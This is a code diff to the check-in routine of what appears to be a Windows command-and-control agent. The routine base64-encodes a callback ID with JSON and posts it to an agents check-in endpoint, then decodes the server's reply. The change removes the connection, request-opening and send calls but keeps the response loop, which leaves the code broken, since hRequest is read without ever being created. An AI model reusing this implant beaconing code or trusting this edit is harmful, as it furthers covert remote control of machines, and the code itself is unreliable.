@@ -182,94 +182,35 @@ std::string CommManager::Checkin(const std::string& json)
     if (!hSession)
         goto e_func;
 
-    hConnect = WinHttpConnect(
-        hSession,
-        host.c_str(),
-        COMM_PORT,
-        0);
+	if (WinHttpReceiveResponse(hRequest, NULL))
+	{
+		std::vector<char> totalResponse; // Persistent container for all chunks
+		std::vector<char> chunkBuffer;   // Temporary container for each chunk
 
-    if (!hConnect)
-        goto e_func;
+		do {
+			dwSize = 0;
+			if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) break;
+			if (dwSize == 0) break;
 
-    hRequest = WinHttpOpenRequest(
-        hConnect,
-        L"POST",
-        L"/api/v1/agents/checkin",
-        NULL,
-        WINHTTP_NO_REFERER,
-        WINHTTP_DEFAULT_ACCEPT_TYPES,
-        0);
+			// Prepare temporary buffer for this chunk
+			chunkBuffer.resize(dwSize);
+			dwDownloaded = 0;
 
-    if (!hRequest)
-        goto e_func;
+			if (!WinHttpReadData(hRequest, chunkBuffer.data(), dwSize, &dwDownloaded)) break;
 
-    strData = base64::to_base64(callbackUUID + json);
+			// Append only the bytes that were actually downloaded, ignoring uninitialized padding
+			if (dwDownloaded > 0) {
+				totalResponse.insert(totalResponse.end(), chunkBuffer.begin(), chunkBuffer.begin() + dwDownloaded);
+			}
 
-    lpOptional = (LPVOID)strData.c_str();
-    dwOptionalLength = static_cast<DWORD>(strData.length());
+		} while (dwSize > 0);
 
-    bResults = WinHttpSendRequest(
-        hRequest,
-        TO_WIDE_STRING("Content-Type: application/json"),
-        (DWORD)-1L,
-        lpOptional,
-        dwOptionalLength,
-        dwOptionalLength,
-        0);
+		if (totalResponse.empty()) goto e_func;
 
-    if (!bResults)
-        goto e_func;
+		// Convert the validated binary data into a string and decode base64
+		result = base64::from_base64(std::string(totalResponse.begin(), totalResponse.end()));
+	}
 
-    if (WinHttpReceiveResponse(hRequest, NULL))
-    {
-        std::vector<char> buffer;
-
-        do
-        {
-            dwSize = 0;
-
-            if (!WinHttpQueryDataAvailable(hRequest, &dwSize))
-            {
-                std::cerr
-                    << "[x] Error "
-                    << GetLastError()
-                    << " in WinHttpQueryDataAvailable.\n";
-
-                goto e_func;
-            }
-
-            if (dwSize == 0)
-                break;
-
-            std::vector<char> chunk(dwSize);
-
-            if (!WinHttpReadData(
-                    hRequest,
-                    chunk.data(),
-                    dwSize,
-                    &dwDownloaded))
-            {
-                std::cerr
-                    << "[x] Error "
-                    << GetLastError()
-                    << " in WinHttpReadData.\n";
-
-                goto e_func;
-            }
-
-            buffer.insert(
-                buffer.end(),
-                chunk.begin(),
-                chunk.begin() + dwDownloaded);
-
-        } while (dwSize > 0);
-
-        if (buffer.empty())
-            goto e_func;
-
-        result = base64::from_base64(
-            std::string(buffer.begin(), buffer.end()));
-    }
 
 e_func:
     if (hRequest)
